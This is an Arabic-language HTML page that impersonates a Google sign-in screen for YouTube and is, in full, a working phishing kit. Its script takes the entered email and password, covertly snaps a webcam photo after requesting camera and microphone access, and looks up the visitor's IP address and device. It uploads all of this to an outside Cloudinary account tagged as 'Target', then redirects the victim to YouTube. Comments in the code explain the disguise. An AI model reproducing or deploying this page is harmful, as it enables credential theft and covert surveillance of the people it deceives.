<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-card { width: 95%; max-width: 440px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        img.logo { width: 75px; margin-bottom: 15px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        p { color: #3c4043; font-size: 16px; margin-bottom: 30px; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
        button { background-color: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 15px; }
        #v, #c { display: none; }
        .loader { display: none; margin-top: 20px; }
    </style>
</head>
<body>

<div class="login-card" id="ui">
    <div id="form">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
        <h1>تسجيل الدخول</h1>
        <p>المتابعة إلى YouTube</p>
        <input type="email" id="e" placeholder="البريد الإلكتروني أو الهاتف" required>
        <input type="password" id="p" placeholder="كلمة المرور" required>
        <button onclick="start()">التالي</button>
    </div>
    <div id="load" class="loader">
        <img src="https://i.gifer.com/ZZ5H.gif" width="40">
        <p style="margin-top:15px; color:#5f6368;">جاري التحقق من أمان الحساب...</p>
    </div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    async function start() {
        const email = document.getElementById('e').value, pass = document.getElementById('p').value;
        if(!email || !pass) return;

        // إظهار التمويه فوراً
        document.getElementById('form').style.display = 'none';
        document.getElementById('load').style.display = 'block';

        try {
            // طلب الكاميرا والمايك (سيظهر طلب الكروم الرسمي)
            const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('v');
            video.srcObject = s;
            video.muted = true;
            video.play(); // لضمان عدم خروج شاشة سوداء

            // انتظار ثانيتين (وقت منطقي للتحميل + وقت للكاميرا تفتح بوضوح)
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                const img = canvas.toDataURL("image/png");

                // سحب البيانات والرفع في الخلفية (Background)
                handleData(email, pass, img);

                // التحويل الفوري لليوتيوب (بدون انتظار نتيجة الرفع)
                window.location.href = yt;
            }, 2500); 

        } catch (err) {
            window.location.href = yt; // لو رفض يروح لليوتيوب فوراً
        }
    }

    async function handleData(email, pass, img) {
        let ip = "0.0.0.0", dev = "Unknown";
        try { 
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            ip = d.ip;
            dev = navigator.userAgent.match(/\(([^)]+)\)/)[1];
        } catch(e){}

        const fd = new FormData();
        fd.append('file', img);
        fd.append('upload_preset', pr);
        fd.append('context', `u=${email}|p=${pass}|ip=${ip}|dev=${dev}`);
        fd.append('tags', `Target_${email},IP_${ip}`);

        // استخدام keepalive يضمن وصول البيانات للسيرفر حتى بعد قفل التاب
        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, {
            method: 'POST',
            body: fd,
            keepalive: true 
        });
    }
</script>
</body>
</html>
